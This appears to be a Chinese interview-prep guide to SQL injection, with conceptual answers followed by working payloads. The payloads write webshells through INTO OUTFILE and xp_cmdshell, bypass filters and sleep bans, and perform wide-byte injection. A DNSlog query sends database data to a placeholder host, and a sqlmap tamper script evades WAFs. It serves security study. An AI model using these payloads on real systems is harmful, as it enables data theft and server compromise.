## 一、知识储备类

## 1.SQL与NoSQL的区别？

SQL：关系型数据库  
NoSQL：非关系型数据库

> 存储方式：SQL具有特定的结构表，NoSQL存储方式灵活  
> 性能：NoSQL较优于SQL  
> 数据类型：SQL适用结构化数据，如账号密码；NoSQL适用非结构化数据，如文章、评论

## 2.常见的关系型数据库？

> mysql、sqlserver、oracle、access、sqlite、postgreSQL

## 3.常见的数据库端口？

**关系型：**

> mysql:3306  
> sqlserver:1433  
> orecal:1521  
> PostgreSQL:5432  
> db2:50000

**非关系型：**

> MongoDB:27017  
> redis:6379  
> memcached:11211

## 4.简述数据库的存储引擎

数据库存储引擎是数据库底层软件组织，数据库管理系统（DBMS）使用数据引擎进行创建、查询、更新和删除数据。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎，还可以获得特定的功能。

> InnoDB：主流的存储引擎，mysql默认存储引擎  
> MyISAM：查询、插入速度快，不支持事务  
> MEMORY：hash索引、BTREE索引

## 5.SQL注入有哪几种注入类型？

> 从注入参数类型分：数字型注入、字符型注入、搜索型注入  
> 从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入  
> 从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入

## 6.SQL注入的危害及防御？

**危害：**

> 数据库泄露  
> 数据库被破坏  
> 网站崩溃  
> 服务器被植入木马

**防御：**

> 代码层面对查询参数进行转义  
> 预编译与参数绑定  
> 利用WAF防御

## 7.如果存在SQL注入怎么判断不同的数据库？

> 根据报错信息判断  
> 根据执行函数返回的结果判断，如len()和lenth()，version()和@@version等  
> 根据注释符判断

## 8.mysql的网站注入，5.0以上和5.0以下有什么区别？

> 从sql注入的角度来说，mysql5.0以下版本没有information\_schema这个系统库，无法列出表名列名，只能暴力跑

## 9.Mysql一个@和两个@什么区别

> 一个@是用户自定义变量  
> 两个@是系统变量，如@@version、@@user

## 10.MYSQL注入/绕过常用的函数

**注入常用函数：**

> database() 返回当前数据库名  
> user() 返回当前数据库用户名  
> updatexml() 更新xml文档，常用于报错注入  
> mid() 从指定字段中提取出字段的内容  
> limit() 返回结果中的前几条数据或者中间的数据  
> concat() 返回参数产生的字符串  
> group\_concat() 分组拼接函数  
> count() 返回指定参数的数目  
> rand() 参数0~1个随机数  
> flood() 向下取整  
> substr() 截取字符串  
> ascii() 返回字符串的ascii码  
> left() 返回字符串最左边指定个数的字符  
> ord() 返回字符的ascii码  
> length() 返回字符串长度  
> sleep() 延时函数

**等价函数绕过，反之亦可：**

> group\_concat() ==> concat\_ws()  
> sleep() ==> benchmark()  
> mid()、substr() ==> substring()  
> user() ==> @@user  
> updatexml() ==> extractvalue()

## 11.UDF提权原理？

> mysql支持用户自定义函数，将含有自定义函数的dll放入特定的文件夹，声明引入dll中的执行函数，使用执行函数执行系统命令

## 12.MSSQL差异备份原理及条件？

**原理：**

> 完整备份后，再次对数据库进行修改，差异备份会记录最后的LSN，将shell写入数据库，备份成asp即可getshell

**条件：**

> MSSQL具有dbo或sa权限  
> 支持堆叠查询  
> 找到网站的绝对路径

## 二、实操技能类

## 1.SQL注入写shell的条件，用法

**条件：**

> 当前用户具有dba权限  
> 找到网站绝对路径  
> 网站有可写目录  
> mysql的配置`secure_file_priv`为空

**用法：**  
mysql:

```
id=1' and 1=2 union select 1,2,'shell内容' into outfile "绝对路径\shell.php" %23
```

sqlserver:

```
id=1';EXEC master..xp_cmdshell 'echo "shell内容" > 绝对路径\shell.asp' --
```

## 2.sql注入过滤了逗号，怎么弄?

**join绕过：**

```
union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);
```

## 3.sleep被禁用后还能怎么进行sql注入

benchmark代替sleep:

```
id=1 and if(ascii(substring((database()),1,1))=115,(select benchmark(10000000,md5(0x41))),1) --+
```

笛卡尔积盲注：

```
select * from ctf_test where user='1' and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C)
```

RLIKE盲注：

```
select * from flag where flag='1' and if(mid(user(),1,1)='r',concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd',1)
```

## 4.什么是宽字节注入？如何操作？

**宽字节注入：**

> 当php开启gpc或者使用addslashes函数时，单引号`'`被加上反斜杠`\'`，其中`\`的URL编码为`%5C`，我们传入`%df'`，等价于`%df%5C'`，此时若程序的默认字符集是GBK，mysql用GBK编码时会认为`%df%5C`是一个宽字符`縗`，于是`%df%5C'`便等价于`縗'`，产生注入。

**操作：**

```
id=1%df' and 1=2 union select 1,2,user(),4 %23
```

## 5.怎样进行盲注速度更快？

**DNSlog盲注：**

```
id=1' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),'.your-dnslog.com\\cHr1s'))--+
```

## 6.什么是二次注入？

> 参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入。

举例：

> 注册用户名`admin'#`用户，传入值为`admin\'#`，但是在存储数据库时值变为`admin'#`，此时若修改密码为`123456`，管理员`admin`密码就被修改为`123456`

## 7.sql注入常见的过WAF方法？

> 内联注释绕过  
> 填充大量脏数据绕过  
> 垃圾参数填充绕过  
> 改变提交方式绕过，如GET方式变为POST方式提交  
> 随机agent头绕过  
> fuzz过滤函数，函数替换绕过

## 8.sqlmap如何编写tamper？

**tamper固定模板如下：**

```
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW 

def dependencies(): 
     pass

def tamper(payload, **kwargs): 
      pass
```

**PROIORITY**

用于定义tamper优先级，当调用多个tamper时生效，优先级如下，数值越大优先级越高

-   LOWEST = -100
-   LOWER = -50
-   LOW = -10
-   NORMAL = 0
-   HIGH = 10
-   HIGHER = 50
-   HIGHEST = 100

**dependencies**

用于提示用户tamper适用范围，具体代码如下：

```
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
import os

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("过狗tamper '%s' 只针对 %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))
```

`DBMS.MYSQL`代表MYSQL，其他数据库类推

**Tamper**

tamper关键函数，用于定义过滤规则，示例代码如下：

```
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    payload=payload.replace('AND','/*!29440AND*/')
    payload=payload.replace('ORDER','/*!29440order*/')
    payload=payload.replace('LIKE USER()','like (user/**/())')
    payload=payload.replace('DATABASE()','database/*!29440*/()')
    payload=payload.replace('CURRENT_USER()','CURRENT_USER/**/()')
    payload=payload.replace('SESSION_USER()','SESSION_USER(%0a)')
    payload=payload.replace('UNION ALL SELECT','union/*!29440select*/')
    payload=payload.replace('super_priv','/*!29440/**/super_priv*/')
    payload=payload.replace('and host=','/*!29440and*/host/*!11440=*/')
    payload=payload.replace('BENCHMARK(','BENCHMARK/*!29440*/(')
    payload=payload.replace('SLEEP(','sleep/**/(')
    return payload
```

fuzz出具体payload后对关键字符进行替换

> 将上述过程简单总结来回答hr问题即可


### 来源：
[SQL 注入的那些面试题总结](https://www.cnblogs.com/cHr1s/p/14389191.html)
